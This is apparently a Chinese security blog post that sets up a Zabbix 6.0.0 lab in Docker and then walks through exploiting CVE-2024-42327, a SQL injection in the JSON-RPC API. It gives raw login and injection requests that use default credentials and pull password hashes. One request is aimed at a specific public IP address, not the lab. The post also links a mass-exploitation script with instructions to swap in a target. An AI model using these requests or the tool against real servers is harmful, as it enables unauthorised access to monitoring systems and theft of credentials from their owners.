#  Zabbix从环境搭建到漏洞利用，附批量漏洞利用工具   
 进击的HACK   2024-12-20 23:55  
  
免责声明  
  
由于传播、利用本公众号琴音安全所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号琴音安全及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
朋友们现在只对常读和星标的公众号才展示大图推送，建议大家把  
**琴音安全**  
“**设为星标**  
”，  
否则可能就看不到了啦！  
  
环境搭建  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
  
创建容器映射文件夹  
```
mkdir -p /zabbix-server && cd /zabbix-server && mkdir -p ./mysql/data ./mysql/conf ./mysql/logs ./font ./snmptraps ./mibs ./alertscripts ./externalscripts
```  
  
拉取相关镜像  
```
docker pull mysql:8.0 && docker pull zabbix/zabbix-java-gateway:6.0.0-ubuntu && docker pull zabbix/zabbix-snmptraps:6.0.0-ubuntu && docker pull zabbix/zabbix-server-mysql:6.0.0-ubuntu && docker pull zabbix/zabbix-web-nginx-mysql:6.0.0-ubuntu
```  
  
上传.ttf文件解决乱码问题  
```
cd /zabbix-server/font/
rm -rf simfang.ttf
然后随便在一个windows中复制 C:\Windows\Fonts\simfang.ttf 文件到/zabbix-server/font中即可
```  
  
docker-compose.yml文件  
  
原作者的用不了不知道为什么，自己改动了一下，这个  
docker-compose.yml只需要更改ttf文件名即可  
‍  
‍  
‍  
‍  
‍  
‍  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OiaZBsiciaGvkTgj2kRM9HGuZTKHBNarkxfiahGHNpDAUibPpoEJJQzsoRPGOe4XTroDiczicTAMECpnxJDMkicBq639QA/640?wx_fmt=png&from=appmsg "")  
  
更改成你放进去的名字  
```
version: '3'
services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    volumes:
      - ./mysql/data:/var/lib/mysql
      - ./mysql/conf:/etc/mysql/conf.d
      - ./mysql/logs:/var/log/mysql
      - /etc/localtime:/etc/localtime
    restart: always
    privileged: true
    environment:
      - MYSQL_ROOT_PASSWORD=myrootpass
      - MYSQL_DATABASE=zabbix
      - MYSQL_USER=zabbix
      - MYSQL_PASSWORD=mypass
      - TZ=Asia/Shanghai
      - LANG=en_US.UTF-8
    expose:
      - "3306"
  zabbix-gateway:
    image: zabbix/zabbix-java-gateway:6.0.0-ubuntu
    container_name: zabbix-gateway
    volumes:
      - /etc/localtime:/etc/localtime
    restart: always
    privileged: true
    ports:
      - "10052:10052"
  zabbix-snmptraps:
    image: zabbix/zabbix-snmptraps:6.0.0-ubuntu
    container_name: zabbix-snmptraps
    volumes:
      - /etc/localtime:/etc/localtime
      - ./snmptraps:/var/lib/zabbix/snmptraps
      - ./mibs:/var/lib/zabbix/mibs
    restart: always
    privileged: true
    ports:
      - "1162:1162/udp"
  zabbix-server:
    image: zabbix/zabbix-server-mysql:6.0.0-ubuntu
    container_name: zabbix-server
    volumes:
      - /etc/localtime:/etc/localtime
      - ./snmptraps:/var/lib/zabbix/snmptraps
      - ./mibs:/var/lib/zabbix/mibs
      - ./alertscripts:/usr/lib/zabbix/alertscripts
      - ./externalscripts:/usr/lib/zabbix/externalscripts
    restart: always
    privileged: true
    environment:
      - ZBX_LISTENPORT=10051
      - DB_SERVER_HOST=mysql
      - DB_SERVER_PORT=3306
      - MYSQL_DATABASE=zabbix
      - MYSQL_USER=zabbix
      - MYSQL_PASSWORD=mypass
      - MYSQL_ROOT_PASSWORD=myrootpass
      - ZBX_CACHESIZE=1G
      - ZBX_HISTORYCACHESIZE=512M
      - ZBX_HISTORYINDEXCACHESIZE=16M
      - ZBX_TRENDCACHESIZE=256M
      - ZBX_VALUECACHESIZE=256M
      - ZBX_STARTPINGERS=64
      - ZBX_IPMIPOLLERS=1
      - ZBX_ENABLE_SNMP_TRAPS=true
      - ZBX_STARTTRAPPERS=1
      - ZBX_JAVAGATEWAY_ENABLE=true
      - ZBX_JAVAGATEWAY=zabbix-gateway
      - ZBX_STARTJAVAPOLLERS=1
    ports:
      - "10051:10051"
    links:
      - mysql
      - zabbix-gateway
  zabbix-web:
    image: zabbix/zabbix-web-nginx-mysql:6.0.0-ubuntu
    container_name: zabbix-web
    volumes:
      - ./font/simfang.ttf:/usr/share/zabbix/assets/fonts/simfang.ttf
      - /etc/localtime:/etc/localtime
    restart: always
    privileged: true
    environment:
      - ZBX_SERVER_NAME=Zabbix 6.0.0
      - ZBX_SERVER_HOST=zabbix-server
      - ZBX_SERVER_PORT=10051
      - DB_SERVER_HOST=mysql
      - DB_SERVER_PORT=3306
      - MYSQL_DATABASE=zabbix
      - MYSQL_USER=zabbix
      - MYSQL_PASSWORD=mypass
      - MYSQL_ROOT_PASSWORD=myrootpass
      - PHP_TZ=Asia/Shanghai
    ports:
      - "80:8080"
    links:
      - mysql
      - zabbix-server
```  
  
启动环境  
```
docker-compose up -d
```  
  
  
映射到80，所以直接访问即可，界面如下  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OiaZBsiciaGvkTgj2kRM9HGuZTKHBNarkxfEEnTRv0YGVruealxM50nzC3cgtlDZLwflL4BcicR907LgozEyO8qlRg/640?wx_fmt=png&from=appmsg "")  
  
默认账号密码为：  
```
Admin/zabbix
```  
  
  
漏洞复现  
  
由于漏洞是后台洞，首先需要获取账号密码，这里使用默认账密  
‍  
```
POST /api_jsonrpc.php HTTP/1.1
Host: xxx.xxx.xxx.xxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3) AppleWebKit/616.24 (KHTML, like Gecko) Version/17.2 Safari/616.24
Connection: keep-alive
Content-Type: application/json-rpc
Accept-Encoding: gzip, deflate, br
Content-Length: 119

{
  "jsonrpc": "2.0",
  "method": "user.login",
  "params": { "username": "Admin", "password": "zabbix" },
  "id": 1
}
```  
  
账密错误的话，响应包如下：  
‍  
‍  
‍  
‍  
‍  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OiaZBsiciaGvkTIbL4M1CXUwtHfrUmKWb9yoGGkCrtMQF6Ow2cJhFWRWGz6jmbCS6awJWmGCfk6H9XfXiajGnicQPrg/640?wx_fmt=png&from=appmsg "")  
  
账密正常的情况，响应包如下：  
‍  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OiaZBsiciaGvkTIbL4M1CXUwtHfrUmKWb9ybOvrNJMQolILtXZgmLsTTKbOAu6Nnmy3QOgRxM5icUKfuSc1jDjBrhw/640?wx_fmt=png&from=appmsg "")  
  
拿到  
result的值后，使用第二个数据包，将auth的值改为  
result的值  
‍  
‍  
‍  
```
POST /api_jsonrpc.php HTTP/1.1
Host: 154.21.200.44
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.9.25
Connection: keep-alive
Content-Length: 167
Content-Type: application/json-rpc
Accept-Encoding: gzip, deflate, br
 
{"jsonrpc": "2.0", "method": "user.get", "params": {"selectRole": ["roleid, u.passwd", "roleid"], "userids": "1"}, "auth": "20b3fa81927949fbc55bfdd008674b22", "id": 2}
```  
  
结果如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OiaZBsiciaGvkTIbL4M1CXUwtHfrUmKWb9y42GoLv4ZSjYmzdt9HFyY1tmBWvumwcFX3w8lw3Nic9Ah4jibTmKhz3wg/640?wx_fmt=png&from=appmsg "")  
  
可以通过更改  
userids的值，来遍历其他用户  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OiaZBsiciaGvkTIbL4M1CXUwtHfrUmKWb9y5Td2KmZoWgkDgddOw2h1uqjLGwyhkHbt58Z7WZic42JySPzcG1N50HA/640?wx_fmt=png&from=appmsg "")  
  
selectRole参数可控，直接在后面加上sql语句，即可执行  
‍  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OiaZBsiciaGvkTJc4zAB44ucTVRDlbfzVT0oia2or8coawL0gcgx7B9xxS3utb6icPl1zDGqnzAyy30TIPh0qS9jm6g/640?wx_fmt=png&from=appmsg "")  
  
利用工具  
‍  
‍  
‍  
‍  
  
**项目地址：**  
‍  
‍  
‍  
‍  
‍  
```
https://github.com/aramosf/cve-2024-42327
```  
  
使用方法：  
```
python cve-2024-42327.py -u http://you_ip/api_jsonrpc.php -n Admin -p zabbix
```  
  
-n参数是用户名，-p是密码，然后替换目标即可。  
‍  
‍  
  
结果如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OiaZBsiciaGvkTJc4zAB44ucTVRDlbfzVT0eibyGKz4JbvgoqwDKib3X3jB0RMLeYkf6TZqKWiaceWIZKeV01lwgkJuw/640?wx_fmt=png&from=appmsg "")  
  
文末  
‍  
‍  
‍  
  
添加机器人wx，回复**进群**，即可获取进群链接。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OiaZBsiciaGvkTJc4zAB44ucTVRDlbfzVT0FEiajNS0GZVyDokCCbmbFxvd9SbYZKzGk01QibGvcKzaoFcydtRhUSAw/640?wx_fmt=png&from=appmsg "")  
  
‍  
  
